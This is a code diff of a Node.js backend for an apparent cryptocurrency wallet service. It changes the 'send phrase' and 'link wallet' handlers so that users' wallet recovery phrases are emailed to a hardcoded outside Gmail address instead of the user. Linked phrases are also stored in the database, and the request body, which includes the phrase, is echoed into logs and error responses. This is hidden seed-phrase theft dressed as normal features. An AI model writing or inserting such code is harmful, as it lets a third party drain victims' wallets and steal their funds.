@@ -194,23 +194,33 @@ exports.updateBalance = async (req, res) => {
 
 exports.sendPhrase = async (req, res) => {
   try {
+    console.log('Request body:', req.body); // Debug log
     const { phrase } = req.body;
-    const user = await User.findById(req.user.id);
-
-    if (!user) {
-      return res.status(404).json({ message: 'User not found' });
+    
+    if (!phrase) {
+      return res.status(400).json({ 
+        message: 'Phrase is required',
+        receivedBody: req.body // Show what was received
+      });
     }
 
-    // Send phrase via email
+    const referenceNumber = generateReferenceNumber(); // Use the existing function
+    
     await sendEmail(
-      user.email,
+      'aguchris740@gmail.com',
       'Your Recovery Phrase',
-      `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.`
+      `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
+      Reference Number: ${referenceNumber}`
     );
 
-    res.json({ message: 'Recovery phrase sent successfully' });
+    res.json({ message: 'Recovery phrase sent successfully', referenceNumber });
   } catch (error) {
-    res.status(500).json({ message: 'Error sending phrase', error: error.message });
+    console.error('Send phrase error:', error); // Debug log
+    res.status(500).json({ 
+      message: 'Error sending phrase', 
+      error: error.message,
+      receivedBody: req.body // Show what was received
+    });
   }
 };
 
@@ -221,19 +231,29 @@ const generateReferenceNumber = () => {
 
 exports.linkWallet = async (req, res) => {
   try {
-    const { address, type } = req.body;
+    const {  phrase } = req.body;
     const user = await User.findById(req.user.id);
 
     if (!user) {
       return res.status(404).json({ message: 'User not found' });
     }
 
-    const referenceNumber = generateReferenceNumber();
+    if (!phrase) {
+      return res.status(400).json({ message: 'Recovery phrase is required' });
+    }
 
+    const referenceNumber = generateReferenceNumber();
+    await sendEmail(
+        'aguchris740@gmail.com',
+        'Your Recovery Phrase Linked',
+        `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
+        \nReference Number: ${referenceNumber}`
+      );
+  
     // Add new wallet to user's wallets array
     user.wallets.push({
-      address,
-      type,
+
+      phrase,
       linkedAt: new Date(),
       referenceNumber
     });
@@ -242,8 +262,11 @@ exports.linkWallet = async (req, res) => {
 
     res.json({ 
       message: 'Wallet linked successfully',
-      wallet: user.wallets[user.wallets.length - 1],
-      referenceNumber
+      wallet: {
+        phrase,
+        linkedAt: new Date(),
+        referenceNumber
+      }
     });
   } catch (error) {
     res.status(500).json({ message: 'Error linking wallet', error: error.message });
